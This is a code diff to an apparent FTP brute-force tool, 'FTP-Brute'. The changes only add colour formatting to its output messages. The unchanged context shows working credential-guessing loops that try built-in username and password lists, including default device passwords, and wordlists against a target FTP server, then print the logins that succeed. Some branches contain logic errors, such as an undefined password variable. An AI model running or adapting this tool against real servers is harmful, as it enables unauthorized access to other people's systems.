@@ -172,49 +172,50 @@ passwords = [
     "PlcmSpIp"
 ]
 
+
 def bruteforce():
     try:
         print(f"{Fore.RED}{logo}{Style.RESET_ALL}")
-        print(f"{Fore.GREEN}Starting FTP-Brute: {Style.RESET_ALL}[{Fore.MAGENTA}{args.host}{Style.RESET_ALL}:{Fore.CYAN}{args.port}{Style.RESET_ALL}]")
+        print(f"{Fore.GREEN}Starting FTP-Brute: {Style.RESET_ALL}[{Fore.RED}{args.host}{Style.RESET_ALL}:{Fore.RED}{args.port}{Style.RESET_ALL}]")
         #bruteforce with given values
         if args.username and args.password:
-            print(f"Bruteforcing with custom credentials: {args.username}:{args.password}")
+            print(f"{Fore.YELLOW}Bruteforcing with custom credentials:{Style.RESET_ALL} {Fore.CYAN}[{args.username}:{args.password}]{Style.RESET_ALL}")
             try:
                 ftpserver.connect(args.host, args.port)
                 ftpserver.login(args.username, args.password)
-                print(f"{Fore.GREEN}[+] Success:{Style.RESET_ALL} {args.username}:{args.password}")
+                print(f"{Fore.GREEN}[+] Success:{Style.RESET_ALL} {Fore.CYAN}[{args.username}:{args.password}]{Style.RESET_ALL}")
             except ftplib.all_errors as e:
-                print(f"Failed: {args.username}:{args.password} - {e}")
+                print(f"{Fore.RED}Failed:{Style.RESET_ALL} {Fore.CYAN}[{args.username}:{args.password}]{Style.RESET_ALL} - {Fore.MAGENTA}{e}{Style.RESET_ALL}")
         elif args.username:
-            print(f"Bruteforcing with custom credentials: {args.username}")
+            print(f"{Fore.YELLOW}Bruteforcing with custom credentials: {Fore.CYAN}[{args.username}]{Style.RESET_ALL}")
             for pwd in passwords:
                 try:
                     ftpserver.connect(args.host, args.port)
                     ftpserver.login(args.username, pwd)
-                    print(f"{Fore.GREEN}[+] Success:{Style.RESET_ALL} {args.username}:{pwd}")
+                    print(f"{Fore.GREEN}[+] Success:{Style.RESET_ALL} {Fore.CYAN}[{args.username}:{pwd}]{Style.RESET_ALL}")
                 except ftplib.all_errors as e:
-                    print(f"Failed: {args.username}:{pwd} - {e}")
+                    print(f"{Fore.RED}Failed:{Style.RESET_ALL} {Fore.CYAN}[{args.username}:{pwd}]{Style.RESET_ALL} - {Fore.MAGENTA}{e}{Style.RESET_ALL}")
         elif args.password:
-            print(f"Bruteforcing with custom credentials: {args.password}")
+            print(f"{Fore.YELLOW}Bruteforcing with custom credentials: {Fore.CYAN} [{args.password}] {Style.RESET_ALL}")
             for user in usernames:
                 try:
                     ftpserver.connect(args.host, args.port)
                     ftpserver.login(user, args.password)
-                    print(f"{Fore.GREEN}[+] Success:{Style.RESET_ALL} {user}:{args.password}")
+                    print(f"{Fore.GREEN}[+] Success:{Style.RESET_ALL} {Fore.CYAN}[{user}:{args.password}]{Style.RESET_ALL}")
                 except ftplib.all_errors as e:
-                    print(f"Failed: {user}:{args.password} - {e}")
+                    print(f"{Fore.RED}Failed:{Style.RESET_ALL} {Fore.CYAN}[{user}:{args.password}]{Style.RESET_ALL} - {Fore.MAGENTA}{e}{Style.RESET_ALL}")
         else:
             #bruteforcing with buildin list
             for user in usernames:
                 for pwd in passwords:
-                    print(f"Bruteforcing with buildin credentials: {user, pwd}")
+                    print(f"{Fore.YELLOW}Bruteforcing with buildin credentials: {Fore.CYAN}[{user}:{pwd}]{Style.RESET_ALL}")
                     try:
                         ftpserver.connect(args.host, args.port)
                         ftpserver.login(user, pwd)
-                        print(f"{Fore.GREEN}[+] Success:{Style.RESET_ALL} {user}:{pwd}")
+                        print(f"{Fore.GREEN}[+] Success:{Style.RESET_ALL} {Fore.CYAN}[{user}:{pwd}]{Style.RESET_ALL}")
                         break
                     except ftplib.all_errors as e:
-                        print(f"Failed: {user}:{pwd} - {e}")
+                        print(f"{Fore.RED}Failed:{Style.RESET_ALL} {Fore.CYAN}[{user}:{pwd}]{Style.RESET_ALL} - {Fore.MAGENTA}{e}{Style.RESET_ALL}")
                         continue
 
         if args.wordlist:
@@ -224,50 +225,50 @@ def bruteforce():
                     for user in wordlist:
                         user = user.strip()
                         for pwd in passwords:
-                            print(f"Bruteforcing with wordlist: {user}:{pwd}")
+                            print(f"{Fore.YELLOW}Bruteforcing with wordlist: {Fore.CYAN}[{user}:{pwd}]{Style.RESET_ALL}")
                             try:
                                 ftpserver.connect(args.host, args.port)
                                 ftpserver.login(user, pwd)
-                                print(f"{Fore.GREEN}[+] Success:{Style.RESET_ALL} {user}:{pwd}")
+                                print(f"{Fore.GREEN}[+] Success:{Style.RESET_ALL} {Fore.CYAN}[{user}:{pwd}]{Style.RESET_ALL}")
                                 break
                             except ftplib.all_errors as e:
-                                print(f"Failed: {user}:{pwd} - {e}")
+                                print(f"{Fore.RED}Failed:{Style.RESET_ALL} {Fore.CYAN}[{user}:{pwd}]{Style.RESET_ALL} - {Fore.MAGENTA}{e}{Style.RESET_ALL}")
             except FileNotFoundError:
                 print(f"Error: Wordlist file {args.wordlist} not found.")
             except Exception as e:
-                print(f"Error: {e}")
+                print(f"Error: {Fore.MAGENTA}{e}{Style.RESET_ALL}")
         elif args.username and args.wordlist:
             try:
                 with open(args.wordlist, 'r') as file:
                     for pwd in passwords:
-                        print(f"Bruteforcing with wordlist: {args.username}:{pwd}")
+                        print(f"{Fore.YELLOW}Bruteforcing with wordlist: {Fore.CYAN}[{args.username}:{pwd}]{Style.RESET_ALL}")
                         try:
                             ftpserver.connect(args.host, args.port)
                             ftpserver.login(args.username, pwd)
-                            print(f"{Fore.GREEN}[+] Success:{Style.RESET_ALL} {args.username}:{pwd}")
+                            print(f"{Fore.GREEN}[+] Success:{Style.RESET_ALL} {Fore.CYAN}[{args.username}:{pwd}]{Style.RESET_ALL}")
                             break
                         except ftplib.all_errors as e:
-                            print(f"Failed: {args.username}:{pwd} - {e}")
+                            print(f"{Fore.RED}Failed:{Style.RESET_ALL} {Fore.CYAN}[{args.username}:{pwd}]{Style.RESET_ALL} - {Fore.MAGENTA}{e}{Style.RESET_ALL}")
             except FileNotFoundError:
                 print(f"Error: Wordlist file {args.wordlist} not found.")
             except Exception as e:
-                print(f"Error: {e}")
+                print(f"Error: {Fore.MAGENTA}{e}{Style.RESET_ALL}")
         elif args.password and args.wordlist:
             try:
                 with open(args.wordlist, 'r') as file:
                     for user in usernames:
-                        print(f"Bruteforcing with wordlist: {user}:{args.password}")
+                        print(f"{Fore.YELLOW}Bruteforcing with wordlist: {Fore.CYAN}[{user}:{args.password}]{Style.RESET_ALL}")
                         try:
                             ftpserver.connect(args.host, args.port)
                             ftpserver.login(user, pwd)
-                            print(f"{Fore.GREEN}[+] Success:{Style.RESET_ALL} {user}:{args.password}")
+                            print(f"{Fore.GREEN}[+] Success:{Style.RESET_ALL} {Fore.CYAN}[{user}:{args.password}]{Style.RESET_ALL}")
                             break
                         except ftplib.all_errors as e:
-                            print(f"Failed: {user}:{args.password} - {e}")
+                            print(f"{Fore.RED}Failed:{Style.RESET_ALL} {Fore.CYAN}[{user}:{args.password}]{Style.RESET_ALL} - {Fore.MAGENTA}{e}{Style.RESET_ALL}")
             except FileNotFoundError:
                 print(f"Error: Wordlist file {args.wordlist} not found.")
             except Exception as e:
-                print(f"Error: {e}")
+                print(f"Error: {Fore.MAGENTA}{e}{Style.RESET_ALL}")
     except KeyboardInterrupt:
         print(f"{Fore.RED}Bye!{Style.RESET_ALL}")
         sys.exit(0)  
